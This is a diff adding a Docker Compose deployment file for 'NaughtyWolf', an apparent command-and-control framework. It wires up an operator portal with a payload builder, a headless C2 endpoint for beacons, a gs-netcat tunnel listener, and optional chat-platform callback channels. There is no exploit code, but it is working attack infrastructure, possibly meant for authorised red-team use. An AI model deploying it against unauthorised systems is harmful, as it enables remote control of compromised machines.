@@ -1,0 +1,107 @@
+# NaughtyWolf VPS deployment: operator portal + headless C2.
+#
+#   docker compose -f deploy/compose.vps.yml up -d
+#
+# Topology, all public traffic on 443 behind Caddy:
+#
+#   gateofbabylon.space/          -> app:8080   operator console, payload
+#                                            builder, portal C2 (/c2/*)
+#   gateofbabylon.space/c2b/*     -> c2:8081    headless C2 (/c2/checkin,
+#                                            /c2/ws) for beacons
+#
+# The two C2s keep separate databases and separate PSKs, so a payload built
+# for one can never be pointed at the other by accident. Nothing publishes an
+# application port directly: Caddy is the only way in.
+
+x-build-base: &build-base
+  context: ..
+  dockerfile: Dockerfile
+
+services:
+  app:
+    build: *build-base
+    environment:
+      NAUGHTYWOLF_BIND: 0.0.0.0:8080
+      NAUGHTYWOLF_DATABASE_URL: sqlite:/data/portal.db?mode=rwc
+      NAUGHTYWOLF_EVIDENCE_DIR: /data/evidence
+      NAUGHTYWOLF_SESSION_SECRET: ${NAUGHTYWOLF_SESSION_SECRET:?Set a unique session secret of at least 32 bytes}
+      NAUGHTYWOLF_C2_PSK: ${NAUGHTYWOLF_C2_PSK:?Set the portal C2 shared key}
+      NAUGHTYWOLF_COOKIE_SECURE: "true"
+      NAUGHTYWOLF_GRPC_BIND: 0.0.0.0:50051
+      # GSocket tunnel target. Port stays on the Compose network and is not
+      # published; the beacon dials out with gs-netcat, it is never exposed.
+      NAUGHTYWOLF_TCP_BIND: ${NAUGHTYWOLF_TCP_BIND:-0.0.0.0:4630}
+      NAUGHTYWOLF_TCP_PROTOCOL: ${NAUGHTYWOLF_TCP_PROTOCOL:-gsocket}
+      # Discord/Telegram are callback channels: the server polls the chat
+      # platform outbound. Set to enable.
+      # NAUGHTYWOLF_DISCORD_CHANNEL: ${NAUGHTYWOLF_DISCORD_CHANNEL:-}
+      # NAUGHTYWOLF_TELEGRAM_CHANNEL: ${NAUGHTYWOLF_TELEGRAM_CHANNEL:-}
+      RUST_LOG: ${RUST_LOG:-info}
+    expose:
+      - "8080"
+      - "50051"
+      - "4630"
+    volumes:
+      - portal-data:/data
+    init: true
+    restart: unless-stopped
+    healthcheck:
+      test: ["CMD", "curl", "--fail", "--silent", "--max-time", "4", "http://127.0.0.1:8080/healthz"]
+      interval: 30s
+      timeout: 5s
+      start_period: 30s
+      retries: 3
+
+  c2:
+    build:
+      context: ..
+      dockerfile: deploy/Dockerfile.c2
+    environment:
+      NW_BIND: 0.0.0.0:8081
+      NW_CALLBACK_HOST: ${NW_CALLBACK_HOST:?Set the public C2 callback origin}
+      NW_PSK: ${NW_C2_PSK:?Set the headless C2 shared key}
+      NW_DB: /data/c2.sqlite
+      NW_DOWNLOADS: /data/downloads
+      # Uncomment to add raw TCP or DNS listeners. Both speak cleartext framed
+      # protocols, so publish them only to a restricted lab network.
+      # NW_TCP_BIND: 0.0.0.0:4630
+      # NW_DNS_BIND: 0.0.0.0:5353
+      RUST_LOG: ${RUST_LOG:-info}
+    expose:
+      - "8081"
+    volumes:
+      - c2-data:/data
+    init: true
+    restart: unless-stopped
+
+  gsocket:
+    image: hackerschoice/gsocket:latest
+    command: ["gs-netcat", "-s", "${GSOCKET_SECRET:?Set a unique GSocket tunnel secret}", "-l", "-d", "app", "-p", "4630"]
+    depends_on:
+      app:
+        condition: service_healthy
+    init: true
+    restart: unless-stopped
+
+  caddy:
+    image: caddy:2-alpine
+    environment:
+      GATEWAY_DOMAIN: ${GATEWAY_DOMAIN:?Set to your public domain}
+    ports:
+      - "80:80"
+      - "443:443"
+      - "443:443/udp"
+    volumes:
+      - ./Caddyfile:/etc/caddy/Caddyfile:ro
+      - caddy-data:/data
+      - caddy-config:/config
+    depends_on:
+      - app
+      - c2
+    restart: unless-stopped
+
+volumes:
+  portal-data:
+  c2-data:
+  caddy-data:
+  caddy-config:
